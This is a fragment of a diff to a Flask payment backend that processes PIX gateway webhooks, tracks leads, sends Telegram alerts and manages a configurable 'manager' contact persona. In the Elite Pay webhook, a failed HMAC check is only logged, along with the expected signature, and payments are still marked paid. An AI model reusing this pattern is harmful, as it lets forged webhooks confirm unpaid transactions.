+        expected_hex = hmac.new(client_secret.encode('utf-8'), base.encode('utf-8'), hashlib.sha256).hexdigest()
+        expected_sig = f"sha256={expected_hex}"
+        if not hmac.compare_digest(sig, expected_sig) and not hmac.compare_digest(sig, expected_hex):
+            log.warning("[WEBHOOK ELITE PAY] HMAC invalido: sig=%s expected=%s", sig, expected_sig)
+    
+    tx_id = (
+        data.get("transactionId") or 
+        data.get("transaction_id") or 
+        data.get("acquirerTransactionId") or 
+        data.get("externalReference")
+    )
+    state = str(data.get("transactionState") or data.get("status") or "").upper().strip()
+    event = str(data.get("event") or "").upper().strip()
+    
+    if not tx_id:
+        return jsonify({"ok": False, "error": "transactionId obrigatorio"}), 400
+        
+    db = get_db()
+    pay = db.execute(
+        "SELECT payment_id, session_id, status FROM payments WHERE transaction_id=? OR payment_id=? OR c7_id=?",
+        (tx_id, tx_id, tx_id)
+    ).fetchone()
+    
+    if not pay:
+        log.warning("[WEBHOOK ELITE PAY] Transacao nao encontrada no banco: tx_id=%s", tx_id)
+        return jsonify({"ok": True, "warning": "Transacao nao encontrada localmente"})
+        
+    payment_id = pay["payment_id"]
+    session_id = pay["session_id"]
+    
+    if state in ("COMPLETO", "CONCLUIDO", "PAID", "APPROVED", "SUCCESS") or event == "DEPOSITO_COMPLETO":
+        db.execute(
+            "UPDATE payments SET status='paid', gateway='elitepay', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
+            (payment_id,)
+        )
+        if session_id:
+            db.execute(
+                "UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
+                (session_id,)
+            )
+        db.commit()
+        log.info("[WEBHOOK ELITE PAY] Pagamento APROVADO! payment_id=%s session_id=%s", payment_id, session_id)
+        
+        if session_id:
+            try:
+                send_telegram_notify(session_id, "PIX_PAID")
+            except Exception as _te:
+                log.warning("[WEBHOOK ELITE PAY] Erro disparando notificacao Telegram: %s", _te)
+                
+    return jsonify({"ok": True, "received": True})
 
 
 # ── Webhook Uniao 7 Pay ────────────────────────────────────────────────────────
@@ -1673,14 +2172,18 @@ def webhook_uniaopay():
 def api_manager():
     db  = get_db()
     mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
-    if not mgr:
-        return jsonify({"ok": False}), 404
+    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+    cfg = {r["key"]: r["value"] for r in cfg_rows}
+    name = cfg.get("mgr_name") or (mgr["name"] if mgr else "Lucas Cardoso")
+    photo = cfg.get("mgr_avatar") or (mgr["photo_url"] if mgr else "/static/images/manager_default.svg")
+    years = cfg.get("mgr_years") or (mgr["since_year"] if mgr else 2025)
+    wa = cfg.get("mgr_whatsapp") or (mgr["whatsapp"] if mgr else "5511999999999")
     return jsonify({
         "ok":        True,
-        "name":      mgr["name"],
-        "photo_url": mgr["photo_url"],
-        "since_year":mgr["since_year"],
-        "whatsapp":  mgr["whatsapp"],
+        "name":      name,
+        "photo_url": photo,
+        "since_year":years,
+        "whatsapp":  wa,
     })
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -2061,11 +2564,7 @@ def api_log_action():
             """, (sid, client_ip))
             db.commit()
             
-        texto = f"{action}" + (f": {details}" if details else "")
-        try:
-            send_telegram_notify(sid, f"STEP_ACTION: {texto}")
-        except Exception as _e:
-            log.warning("[TG] STEP_ACTION notify falhou: %s", _e)
+        log.info("[LEAD ACTION] session=%s action=%s details=%s", sid, action, details)
     return jsonify({"ok": True})
 
 
@@ -2114,6 +2613,17 @@ def process_bot_action(action, payload=None):
     elif action == "set_config":
         for k, v in payload.items():
             db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (k, v))
+            if k == "mgr_name":
+                db.execute("UPDATE manager SET name=?, updated_at=cast(strftime('%s','now') as real) WHERE id=1", (v,))
+            elif k == "mgr_whatsapp":
+                db.execute("UPDATE manager SET whatsapp=?, updated_at=cast(strftime('%s','now') as real) WHERE id=1", (v,))
+            elif k == "mgr_years":
+                try:
+                    db.execute("UPDATE manager SET since_year=?, updated_at=cast(strftime('%s','now') as real) WHERE id=1", (int(v),))
+                except Exception:
+                    pass
+            elif k == "mgr_avatar":
+                db.execute("UPDATE manager SET photo_url=?, updated_at=cast(strftime('%s','now') as real) WHERE id=1", (v,))
         db.commit()
         return {"ok": True}
         
@@ -2148,6 +2658,21 @@ def process_bot_action(action, payload=None):
             "security_status": "🟢 Blindagem Ant-Scrape Ativa"
         }
         return {"ok": True, "stats": stats}
+    elif action == "get_gateway_metrics":
+        return {"ok": True, "metrics": get_gateway_metrics()}
+        
+    elif action == "set_active_gateway":
+        target_gw = str(payload.get("gateway", "")).lower().strip()
+        if target_gw in ("elitepay", "uniaopay"):
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('active_gateway', ?)", (target_gw,))
+            db.commit()
+            gw_display = "Elite PAYbr" if target_gw == "elitepay" else "União 7 Pay"
+            return {"ok": True, "active_gateway": target_gw, "name": gw_display}
+        return {"ok": False, "error": f"Gateway '{target_gw}' inválido. Escolha 'elitepay' ou 'uniaopay'."}
+        
+    elif action == "test_gateways_health":
+        return {"ok": True, "metrics": get_gateway_metrics()}
+
     elif action == "reset_system":
         db.execute("DELETE FROM leads")
         db.execute("DELETE FROM payments")
